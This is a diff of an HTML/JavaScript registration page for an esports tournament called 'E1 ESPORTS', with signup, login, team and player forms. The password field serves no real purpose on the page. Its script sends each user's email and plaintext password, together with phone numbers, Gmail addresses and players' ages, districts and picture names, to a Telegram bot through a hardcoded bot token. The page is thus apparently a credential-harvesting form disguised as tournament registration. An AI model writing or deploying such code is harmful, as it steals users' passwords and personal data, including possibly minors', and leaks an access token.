@@ -1,204 +1,943 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
+
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <title>E1 ESPORTS | REGISTRATION</title>
+
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+
 <style>
-    :root { --primary-red: #ff3131; --bg-dark: #0b1220; --card-bg: #1b2230; --input-bg: #2d3748; --text-gray: #94a3b8; }
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
-    body { background-color: var(--bg-dark); color: white; padding-bottom: 90px; }
 
-    /* SLOT COUNTER DESIGN */
-    .slot-counter { position: fixed; top: 75px; right: 15px; background: var(--primary-red); color: white; padding: 5px 12px; border-radius: 20px; font-family: 'Orbitron'; font-size: 12px; font-weight: bold; z-index: 99; box-shadow: 0 4px 10px rgba(255, 49, 49, 0.4); border: 1px solid white; }
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:'Inter',sans-serif;
+transition:none !important;
+animation:none !important;
+transform:none !important;
+}
 
-    .header { background: #080c14; padding: 15px; display: flex; align-items: center; border-bottom: 1px solid #2d3748; position: sticky; top: 0; z-index: 100; }
-    .header .logo { display: flex; align-items: center; gap: 10px; color: var(--primary-red); font-family: 'Orbitron'; font-size: 18px; font-weight: bold; text-decoration: none; }
-    .header .logo img { height: 35px; width: 35px; border-radius: 4px; border: 1px solid var(--primary-red); object-fit: cover; }
-    
-    .container { padding: 30px 20px; display: flex; justify-content: center; align-items: center; min-height: 85vh; }
-    .card { background: var(--card-bg); width: 100%; max-width: 420px; padding: 35px; border-radius: 12px; display: none; border: 1px solid #2d3748; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-    .card.active { display: block; animation: fadeIn 0.3s ease-out; }
-    @keyframes fadeIn { from{opacity: 0; transform: translateY(10px);} to{opacity: 1; transform: translateY(0);} }
+html,
+body{
+overflow-x:hidden;
+background:#0b1220;
+color:white;
+scroll-behavior:smooth;
+}
 
-    h1 { font-family: 'Orbitron'; font-size: 24px; margin-bottom: 8px; }
-    .subtitle { color: var(--text-gray); font-size: 13px; margin-bottom: 25px; }
+body{
+padding-bottom:90px;
+}
 
-    .field { margin-bottom: 18px; text-align: left; }
-    .field label { display: block; font-size: 12px; font-weight: 600; margin-bottom: 8px; color: #fff; }
-    .field input, .field select { width: 100%; padding: 14px; background: var(--input-bg); border: 1px solid #3e4b5e; border-radius: 8px; color: white; outline: none; font-size: 14px; }
+:root{
+--primary-red:#ff3131;
+--bg-dark:#0b1220;
+--card-bg:#1b2230;
+--input-bg:#2d3748;
+--text-gray:#94a3b8;
+}
 
-    .btn-red { width: 100%; padding: 16px; background: var(--primary-red); border: none; border-radius: 8px; color: white; font-weight: 700; cursor: pointer; transition: 0.3s; font-size: 15px; }
-    .footer-text { text-align: center; margin-top: 20px; font-size: 13px; color: var(--text-gray); }
-    .footer-text span { color: var(--primary-red); cursor: pointer; font-weight: 600; }
+/* SLOT */
 
-    .rule-item { font-size: 12px; line-height: 1.5; color: #cbd5e1; margin-bottom: 8px; padding-left: 8px; border-left: 2px solid var(--primary-red); }
+.slot-counter{
+position:fixed;
+top:75px;
+right:15px;
+background:var(--primary-red);
+color:white;
+padding:6px 13px;
+border-radius:20px;
+font-family:'Orbitron';
+font-size:12px;
+font-weight:bold;
+z-index:999;
+border:1px solid white;
+}
 
-    .bottom-nav { position: fixed; bottom: 0; width: 100%; height: 75px; background: #080c14; border-top: 1px solid #2d3748; display: flex; justify-content: space-around; align-items: center; z-index: 1000; }
-    .nav-btn { color: var(--text-gray); font-size: 10px; text-align: center; cursor: pointer; text-decoration: none; }
-    .nav-btn i { font-size: 18px; display: block; margin-bottom: 4px; color: white; }
+/* HEADER */
+
+.header{
+background:#080c14;
+padding:15px;
+display:flex;
+align-items:center;
+border-bottom:1px solid #2d3748;
+position:sticky;
+top:0;
+z-index:999;
+}
+
+.logo{
+display:flex;
+align-items:center;
+gap:10px;
+color:var(--primary-red);
+font-family:'Orbitron';
+font-size:18px;
+font-weight:bold;
+}
+
+.logo img{
+height:35px;
+width:35px;
+border-radius:5px;
+border:1px solid var(--primary-red);
+object-fit:cover;
+}
+
+/* CONTAINER */
+
+.container{
+padding:25px 18px;
+display:flex;
+justify-content:center;
+align-items:center;
+min-height:85vh;
+}
+
+/* CARD */
+
+.card{
+background:var(--card-bg);
+width:100%;
+max-width:430px;
+padding:30px;
+border-radius:14px;
+display:none;
+border:1px solid #2d3748;
+box-shadow:0 10px 30px rgba(0,0,0,0.4);
+min-height:650px;
+}
+
+.card.active{
+display:block;
+}
+
+/* TEXT */
+
+h1{
+font-family:'Orbitron';
+font-size:24px;
+margin-bottom:8px;
+}
+
+.subtitle{
+color:var(--text-gray);
+font-size:13px;
+margin-bottom:22px;
+}
+
+/* FORM */
+
+.field{
+margin-bottom:18px;
+}
+
+.field label{
+display:block;
+margin-bottom:8px;
+font-size:12px;
+font-weight:600;
+}
+
+.field input,
+.field select{
+width:100%;
+padding:14px;
+background:var(--input-bg);
+border:1px solid #3e4b5e;
+border-radius:8px;
+color:white;
+outline:none;
+font-size:14px;
+}
+
+/* BIG IMAGE BOX */
+
+.upload-box{
+width:100%;
+height:190px;
+border:2px dashed #ff3131;
+border-radius:15px;
+background:#1f2937;
+display:flex;
+justify-content:center;
+align-items:center;
+flex-direction:column;
+cursor:pointer;
+position:relative;
+overflow:hidden;
+text-align:center;
+}
+
+.upload-box span{
+font-size:70px;
+color:#ff3131;
+font-weight:bold;
+line-height:1;
+}
+
+.upload-box p{
+margin-top:8px;
+font-size:14px;
+color:white;
+}
+
+.upload-box img{
+position:absolute;
+top:0;
+left:0;
+width:100%;
+height:100%;
+object-fit:cover;
+display:none;
+z-index:0;
+}
+
+.upload-box input{
+display:none;
+}
+
+/* BUTTON */
+
+.btn-red{
+width:100%;
+padding:15px;
+background:var(--primary-red);
+border:none;
+border-radius:8px;
+color:white;
+font-size:15px;
+font-weight:700;
+cursor:pointer;
+}
+
+/* FOOTER */
+
+.footer-text{
+text-align:center;
+margin-top:20px;
+font-size:13px;
+color:var(--text-gray);
+}
+
+.footer-text span{
+color:var(--primary-red);
+font-weight:600;
+cursor:pointer;
+}
+
+/* RULE */
+
+.rule-item{
+font-size:12px;
+line-height:1.5;
+color:#cbd5e1;
+margin-bottom:10px;
+padding-left:8px;
+border-left:2px solid var(--primary-red);
+}
+
+/* NAV */
+
+.bottom-nav{
+position:fixed;
+bottom:0;
+width:100%;
+height:75px;
+background:#080c14;
+border-top:1px solid #2d3748;
+display:flex;
+justify-content:space-around;
+align-items:center;
+z-index:1000;
+}
+
+.nav-btn{
+color:var(--text-gray);
+font-size:10px;
+text-align:center;
+text-decoration:none;
+cursor:pointer;
+}
+
+.nav-btn i{
+display:block;
+font-size:18px;
+margin-bottom:4px;
+color:white;
+}
+
 </style>
+
 </head>
+
 <body>
 
-<div class="slot-counter">SLOTS LEFT: <span id="slotNum">148</span></div>
+<div class="slot-counter">
+SLOTS LEFT:
+<span id="slotNum">148</span>
+</div>
 
 <div class="header">
-    <div class="logo">
-        <img src="https://i.ibb.co.com/qMJ10dd5/Screenshot-20260507-211544-Whats-App.jpg" alt="Logo">
-        E1 ESPORTS
-    </div>
+
+<div class="logo">
+
+<img src="https://i.ibb.co.com/qMJ10dd5/Screenshot-20260507-211544-Whats-App.jpg">
+
+E1 ESPORTS
+
+</div>
+
 </div>
 
 <div class="container">
-    <div class="card active" id="registerPage">
-        <h1>Create Account</h1>
-        <p class="subtitle">Join thousands of competitive gamers!</p>
-        <div class="field"><label>Full Name *</label><input type="text" id="fn" placeholder="Your Name"></div>
-        <div class="field"><label>Email Address *</label><input type="email" id="em" placeholder="Email Address"></div>
-        <div class="field"><label>Password *</label><input type="password" id="ps" placeholder="Password"></div>
-        <div class="field"><label>Confirm Password *</label><input type="password" id="cps" placeholder="Confirm Password"></div>
-        <button class="btn-red" onclick="doRegister()">Create Account</button>
-        <p class="footer-text">Already have an account? <span onclick="show('loginPage')">Login here</span></p>
-    </div>
 
-    <div class="card" id="loginPage">
-        <h1>Welcome Back</h1>
-        <p class="subtitle">Login to your account to continue</p>
-        <div class="field"><label>Email Address *</label><input type="email" id="le" placeholder="Email Address"></div>
-        <div class="field"><label>Password *</label><input type="password" id="lp" placeholder="Password"></div>
-        <button class="btn-red" onclick="doLogin()">Login</button>
-        <p class="footer-text">Don't have an account? <span onclick="show('registerPage')">Sign up here</span></p>
-    </div>
+<!-- REGISTER -->
 
-    <div class="card" id="teamPage">
-        <h1>Team Info</h1>
-        <p class="subtitle">Leader details for the tournament</p>
-        <div class="field"><label>Team Name *</label><input type="text" id="tn" placeholder="Ex: Noob Legend"></div>
-        <div class="field"><label>Team Tag *</label><input type="text" id="tt" placeholder="Ex: NL"></div>
-        <div class="field"><label>Leader WhatsApp *</label><input type="text" id="lw" placeholder="017xxxxxxxx"></div>
-        <div class="field"><label>Leader Gmail *</label><input type="email" id="lg" placeholder="example@gmail.com"></div>
-        <button class="btn-red" onclick="show('playerPage')">Next: Players</button>
-    </div>
+<div class="card active" id="registerPage">
 
-    <div class="card" id="playerPage">
-        <h1 id="pt">Player 1</h1>
-        <p class="subtitle">Game details for player registration</p>
-        <div class="field"><label>IGN *</label><input type="text" id="pign" placeholder="Game Name"></div>
-        <div class="field"><label>UID *</label><input type="text" id="puid" placeholder="Game ID"></div>
-        <div class="field"><label>Role *</label>
-            <select id="prole">
-                <option value="Rusher">Rusher</option>
-                <option value="Sniper">Sniper</option>
-                <option value="IGL">IGL</option>
-                <option value="Support">Support</option>
-            </select>
-        </div>
-        <button class="btn-red" onclick="nextP()">Next Player</button>
-    </div>
+<h1>Create Account</h1>
 
-    <div class="card" id="statusPage">
-        <h1>Check Status</h1>
-        <div class="field"><label>WhatsApp Number *</label><input type="text" id="sn" placeholder="01xxxxxxxxx"></div>
-        <button class="btn-red" onclick="checkStatus()">Check Now</button>
-        <p id="stResult" style="margin-top:20px; text-align:center; font-weight:bold;"></p>
-    </div>
+<p class="subtitle">
+Join thousands of competitive gamers!
+</p>
 
-    <div class="card" id="ruleBookPage">
-        <h1>Rule Book</h1>
-        <p class="subtitle">Follow these rules strictly</p>
-        <div style="margin-bottom: 20px; text-align: left;">
-            <div class="rule-item"><b>Mobile Only:</b> Emulator allowed na.</div>
-            <div class="rule-item"><b>Fair Play:</b> No hacks or scripts.</div>
-            <div class="rule-item"><b>Behavior:</b> No toxic behavior.</div>
-        </div>
-        <button class="btn-red" onclick="show('registerPage')">Back</button>
-    </div>
-
-    <div class="card" id="done" style="text-align:center;">
-        <h1 style="color: #10b981;">Reg Success!</h1>
-        <p style="margin-top:15px;">অভিনন্দন!
- আপনার আবেদনটি আমরা পেয়েছি।
-​টুর্নামেন্ট সম্পর্কিত সকল তথ্য, নোটিশ এবং জরুরি আপডেটের জন্য আমাদের কমিউনিটির সাথে যুক্ত থাকা প্রয়োজন। নিচের Join WhatsApp বাটনে ক্লিক করে দ্রুত আমাদের গ্রুপে চলে আসুন।.</p>
-        <a href="https://chat.whatsapp.com/LfHxYQ48m7PLnOaFrxz4iy" class="btn-red" style="text-decoration:none; display:block; background:#25D366; margin-top:20px;">JOIN WHATSAPP</a>
-    </div>
+<div class="field">
+<label>Full Name *</label>
+<input type="text" id="fn" placeholder="Your Name">
 </div>
 
+<div class="field">
+<label>Email Address *</label>
+<input type="email" id="em" placeholder="Email Address">
+</div>
+
+<div class="field">
+<label>Password *</label>
+<input type="password" id="ps" placeholder="Password">
+</div>
+
+<div class="field">
+<label>Confirm Password *</label>
+<input type="password" id="cps" placeholder="Confirm Password">
+</div>
+
+<button class="btn-red" onclick="doRegister()">
+Create Account
+</button>
+
+<p class="footer-text">
+Already have an account?
+<span onclick="show('loginPage')">
+Login here
+</span>
+</p>
+
+</div>
+
+<!-- LOGIN -->
+
+<div class="card" id="loginPage">
+
+<h1>Welcome Back</h1>
+
+<p class="subtitle">
+Login to your account to continue
+</p>
+
+<div class="field">
+<label>Email Address *</label>
+<input type="email" id="le" placeholder="Email Address">
+</div>
+
+<div class="field">
+<label>Password *</label>
+<input type="password" id="lp" placeholder="Password">
+</div>
+
+<button class="btn-red" onclick="doLogin()">
+Login
+</button>
+
+<p class="footer-text">
+Don't have an account?
+<span onclick="show('registerPage')">
+Sign up here
+</span>
+</p>
+
+</div>
+
+<!-- TEAM -->
+
+<div class="card" id="teamPage">
+
+<h1>Team Info</h1>
+
+<p class="subtitle">
+Leader details for the tournament
+</p>
+
+<div class="field">
+<label>Team Name *</label>
+<input type="text" id="tn" placeholder="Ex: Noob Legend">
+</div>
+
+<div class="field">
+<label>Team Tag *</label>
+<input type="text" id="tt" placeholder="Ex: NL">
+</div>
+
+<div class="field">
+<label>Leader WhatsApp *</label>
+<input type="text" id="lw" placeholder="017xxxxxxxx">
+</div>
+
+<div class="field">
+<label>Leader Gmail *</label>
+<input type="email" id="lg" placeholder="example@gmail.com">
+</div>
+
+<button class="btn-red" onclick="show('playerPage')">
+Next: Players
+</button>
+
+</div>
+
+<!-- PLAYER -->
+
+<div class="card" id="playerPage">
+
+<h1 id="pt">Player 1</h1>
+
+<p class="subtitle">
+Game details for player registration
+</p>
+
+<div class="field">
+<label>IGN *</label>
+<input type="text" id="pign" placeholder="Game Name">
+</div>
+
+<div class="field">
+<label>UID *</label>
+<input type="text" id="puid" placeholder="UID">
+</div>
+
+<div class="field">
+
+<label>Role *</label>
+
+<select id="prole">
+
+<option value="Rusher">Rusher</option>
+<option value="Sniper">Sniper</option>
+<option value="IGL">IGL</option>
+<option value="Support">Support</option>
+
+</select>
+
+</div>
+
+<div class="field">
+<label>Player Age *</label>
+<input type="number" id="page" placeholder="Enter Age">
+</div>
+
+<div class="field">
+
+<label>Select District *</label>
+
+<select id="pdistrict">
+
+<option value="">Choose District</option>
+
+<option>Dhaka</option>
+<option>Chattogram</option>
+<option>Cox's Bazar</option>
+<option>Comilla</option>
+<option>Feni</option>
+<option>Noakhali</option>
+<option>Khagrachari</option>
+<option>Bandarban</option>
+<option>Rangamati</option>
+<option>Sylhet</option>
+<option>Mymensingh</option>
+<option>Rajshahi</option>
+<option>Khulna</option>
+<option>Barishal</option>
+<option>Rangpur</option>
+<option>Bogra</option>
+<option>Jessore</option>
+<option>Pabna</option>
+<option>Kushtia</option>
+<option>Narayanganj</option>
+<option>Gazipur</option>
+<option>Tangail</option>
+<option>Faridpur</option>
+<option>Dinajpur</option>
+
+</select>
+
+</div>
+
+<div class="field">
+
+<label>Player Esports Style Picture *</label>
+
+<label class="upload-box">
+
+<input type="file"
+id="ppic"
+accept="image/*"
+onchange="previewImage(event)">
+
+<img id="preview">
+
+<span>+</span>
+
+<p>
+ Upload Player esports style Pic
+</p>
+
+</label>
+
+</div>
+
+<button class="btn-red" onclick="nextP()">
+Next Player
+</button>
+
+</div>
+
+<!-- STATUS -->
+
+<div class="card" id="statusPage">
+
+<h1>Check Status</h1>
+
+<div class="field">
+
+<label>WhatsApp Number *</label>
+
+<input type="text"
+id="sn"
+placeholder="01xxxxxxxxx">
+
+</div>
+
+<button class="btn-red"
+onclick="checkStatus()">
+
+Check Now
+
+</button>
+
+<p id="stResult"
+style="margin-top:20px;text-align:center;font-weight:bold;">
+</p>
+
+</div>
+
+<!-- RULE -->
+
+<div class="card" id="ruleBookPage">
+
+<h1>Rule Book</h1>
+
+<p class="subtitle">
+Follow these rules strictly
+</p>
+
+<div style="margin-bottom:20px;">
+
+<div class="rule-item">
+<b>Mobile Only:</b>
+Emulator not allowed </div>
+
+<div class="rule-item">
+<b>Mobile Only:</b>
+Emulator not allowed </div>
+
+<div class="rule-item">
+<b>Fair Play:</b>
+No hacks or scripts.
+</div>
+
+<div class="rule-item">
+<b>Behavior:</b>
+No toxic behavior.
+</div>
+
+</div>
+
+<button class="btn-red"
+onclick="show('registerPage')">
+
+Back
+
+</button>
+
+</div>
+
+<!-- DONE -->
+
+<div class="card"
+id="done"
+style="text-align:center;">
+
+<h1 style="color:#10b981;">
+Reg Success!
+</h1>
+
+<p style="margin-top:15px;line-height:1.7;">
+
+অভিনন্দন!
+আপনার আবেদনটি আমরা পেয়েছি।
+
+টুর্নামেন্ট সম্পর্কিত সকল তথ্য,
+নোটিশ এবং জরুরি আপডেটের জন্য
+আমাদের WhatsApp গ্রুপে জয়েন করুন।
+
+</p>
+
+<a href="https://chat.whatsapp.com/LfHxYQ48m7PLnOaFrxz4iy"
+class="btn-red"
+style="display:block;background:#25D366;text-decoration:none;margin-top:20px;">
+
+JOIN WHATSAPP
+
+</a>
+
+</div>
+
+</div>
+
+<!-- NAV -->
+
 <div class="bottom-nav">
-    <div class="nav-btn" onclick="show('registerPage')"><i>📜</i>Register</div>
-    <div class="nav-btn" onclick="show('statusPage')"><i>📊</i>Status</div>
-    <div class="nav-btn" onclick="show('ruleBookPage')"><i>📄</i>Rules</div>
-    <a href="https://wa.me/8801700000000" class="nav-btn"><i>📞</i>Helpline</a> 
+
+<div class="nav-btn"
+onclick="show('registerPage')">
+
+<i>📜</i>
+Register
+
+</div>
+
+<div class="nav-btn"
+onclick="show('statusPage')">
+
+<i>📊</i>
+Status
+
+</div>
+
+<div class="nav-btn"
+onclick="show('ruleBookPage')">
+
+<i>📄</i>
+Rules
+
+</div>
+
+<a href="https://wa.me/8801869147764"
+class="nav-btn">
+
+<i>📞</i>
+Helpline
+
+</a>
+
 </div>
 
 <script>
-    const TOKEN = "8603950186:AAHuczjaf2dOJ6VD-c3rb0nYlDEj2Zsw7Bk";
-    const CHAT = "6932637485";
-    let count = 1, data = { players: [] };
-    
-    // SLOT LOGIC
-    let totalSlots = 148;
-    let registeredTeams = localStorage.getItem('teamsRegistered') || 0;
-    document.getElementById('slotNum').innerText = totalSlots - registeredTeams;
 
-    function show(id) {
-        document.querySelectorAll('.card').forEach(c => c.classList.remove('active'));
-        document.getElementById(id).classList.add('active');
-        window.scrollTo(0,0);
-    }
+const TOKEN =
+"8603950186:AAHuczjaf2dOJ6VD-c3rb0nYlDEj2Zsw7Bk";
 
-    function doRegister() {
-        const em = document.getElementById('em').value, ps = document.getElementById('ps').value;
-        if(!em || !ps) return alert("Fill all fields!");
-        localStorage.setItem('u_e', em); localStorage.setItem('u_p', ps);
-        localStorage.setItem('u_n', document.getElementById('fn').value);
-        alert("Account Created!"); show('loginPage');
-    }
+const CHAT =
+"8603950186";
 
-    function doLogin() {
-        if(document.getElementById('le').value === localStorage.getItem('u_e')) show('teamPage');
-        else alert("Login Failed!");
-    }
+let count = 1;
 
-    function checkStatus() {
-        const n = document.getElementById('sn').value;
-        document.getElementById('stResult').innerText = localStorage.getItem('reg_' + n) ? "Registered!  ✅" : "Not Found ❌";
-    }
+let data = {
+players:[]
+};
 
-    function nextP() {
-        const ign = document.getElementById('pign').value, uid = document.getElementById('puid').value;
-        if(!ign || !uid) return alert("Fill details!");
-        data.players.push({ ign, uid, role: document.getElementById('prole').value });
+let totalSlots = 148;
 
-        if(count < 5) {
-            count++;
-            document.getElementById('pign').value = ""; document.getElementById('puid').value = "";
-            document.getElementById('pt').innerText = `Player ${count}`;
-        } else {
-            const wa = document.getElementById('lw').value;
-            localStorage.setItem('reg_' + wa, "ok");
-            
-            // UPDATE SLOT
-            registeredTeams++;
-            localStorage.setItem('teamsRegistered', registeredTeams);
-            document.getElementById('slotNum').innerText = totalSlots - registeredTeams;
-            
-            show('done');
+let registeredTeams =
+localStorage.getItem('teamsRegistered') || 0;
 
-            let msg = `🏆 **E1 ESPORTS REGISTRATION** 🏆\n\n`;
-            msg += `🔐 **LOGIN INFO:**\nEmail: ${localStorage.getItem('u_e')}\nPass: ${localStorage.getItem('u_p')}\n\n`;
-            msg += `📌 **TEAM INFO:**\nName: ${document.getElementById('tn').value}\nTag: ${document.getElementById('tt').value}\nWA: ${wa}\nGmail: ${document.getElementById('lg').value}\n\n`;
-            msg += `👤 **PLAYERS:**\n`;
-            data.players.forEach((p, i) => msg += `P${i+1}: ${p.ign} | ID: ${p.uid} (${p.role})\n`);
+document.getElementById('slotNum').innerText =
+totalSlots - registeredTeams;
 
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: "POST",
-                headers: {"Content-Type":"application/json"},
-                body: JSON.stringify({ chat_id: CHAT, text: msg, parse_mode: "Markdown" })
-            });
-        }
-    }
+function show(id){
+
+document.querySelectorAll('.card')
+.forEach(c=>c.classList.remove('active'));
+
+document.getElementById(id)
+.classList.add('active');
+
+window.scrollTo(0,0);
+
+}
+
+function doRegister(){
+
+const em =
+document.getElementById('em').value;
+
+const ps =
+document.getElementById('ps').value;
+
+const cps =
+document.getElementById('cps').value;
+
+if(!em || !ps || !cps){
+
+return alert("Fill all fields!");
+
+}
+
+if(ps !== cps){
+
+return alert("Password Not Match!");
+
+}
+
+localStorage.setItem('u_e',em);
+localStorage.setItem('u_p',ps);
+
+alert("Account Created!");
+
+show('loginPage');
+
+}
+
+function doLogin(){
+
+if(
+document.getElementById('le').value
+===
+localStorage.getItem('u_e')
+&&
+document.getElementById('lp').value
+===
+localStorage.getItem('u_p')
+){
+
+show('teamPage');
+
+}else{
+
+alert("Login Failed!");
+
+}
+
+}
+
+function checkStatus(){
+
+const n =
+document.getElementById('sn').value;
+
+document.getElementById('stResult').innerText =
+
+localStorage.getItem('reg_' + n)
+
+?
+
+"Registered ✅"
+
+:
+
+"Not Found ❌";
+
+}
+
+function previewImage(event){
+
+const img =
+document.getElementById('preview');
+
+img.src =
+URL.createObjectURL(event.target.files[0]);
+
+img.style.display = "block";
+
+}
+
+function nextP(){
+
+const ign =
+document.getElementById('pign').value;
+
+const uid =
+document.getElementById('puid').value;
+
+const role =
+document.getElementById('prole').value;
+
+const age =
+document.getElementById('page').value;
+
+const district =
+document.getElementById('pdistrict').value;
+
+const pic =
+document.getElementById('ppic').files[0];
+
+if(
+!ign ||
+!uid ||
+!age ||
+!district ||
+!pic
+){
+
+return alert("Fill all player details!");
+
+}
+
+data.players.push({
+
+ign,
+uid,
+role,
+age,
+district,
+picture:pic.name
+
+});
+
+if(count < 5){
+
+count++;
+
+document.getElementById('pign').value="";
+document.getElementById('puid').value="";
+document.getElementById('page').value="";
+document.getElementById('pdistrict').value="";
+document.getElementById('ppic').value="";
+document.getElementById('preview').style.display="none";
+
+document.getElementById('pt').innerText =
+`Player ${count}`;
+
+}else{
+
+const wa =
+document.getElementById('lw').value;
+
+localStorage.setItem('reg_' + wa,"ok");
+
+registeredTeams++;
+
+localStorage.setItem(
+'teamsRegistered',
+registeredTeams
+);
+
+document.getElementById('slotNum').innerText =
+totalSlots - registeredTeams;
+
+show('done');
+
+let msg =
+`🏆 E1 ESPORTS REGISTRATION 🏆\n\n`;
+
+msg +=
+`🔐 LOGIN INFO:\n`;
+
+msg +=
+`Email: ${localStorage.getItem('u_e')}\n`;
+
+msg +=
+`Password: ${localStorage.getItem('u_p')}\n\n`;
+
+msg +=
+`📌 TEAM INFO:\n`;
+
+msg +=
+`Team: ${document.getElementById('tn').value}\n`;
+
+msg +=
+`Tag: ${document.getElementById('tt').value}\n`;
+
+msg +=
+`WhatsApp: ${wa}\n`;
+
+msg +=
+`Leader Gmail: ${document.getElementById('lg').value}\n\n`;
+
+msg +=
+`👤 PLAYERS:\n\n`;
+
+data.players.forEach((p,i)=>{
+
+msg +=
+`Player ${i+1}\n`;
+
+msg +=
+`IGN: ${p.ign}\n`;
+
+msg +=
+`UID: ${p.uid}\n`;
+
+msg +=
+`Role: ${p.role}\n`;
+
+msg +=
+`Age: ${p.age}\n`;
+
+msg +=
+`District: ${p.district}\n`;
+
+msg +=
+`Picture: ${p.picture}\n\n`;
+
+});
+
+fetch(
+`https://api.telegram.org/bot${TOKEN}/sendMessage`,
+{
+method:"POST",
+
+headers:{
+"Content-Type":"application/json"
+},
+
+body:JSON.stringify({
+
+chat_id:CHAT,
+text:msg
+
+})
+
+});
+
+}
+
+}
+
 </script>
+
 </body>
-</html>
+</html
+
+
+
+
+
+
+
+
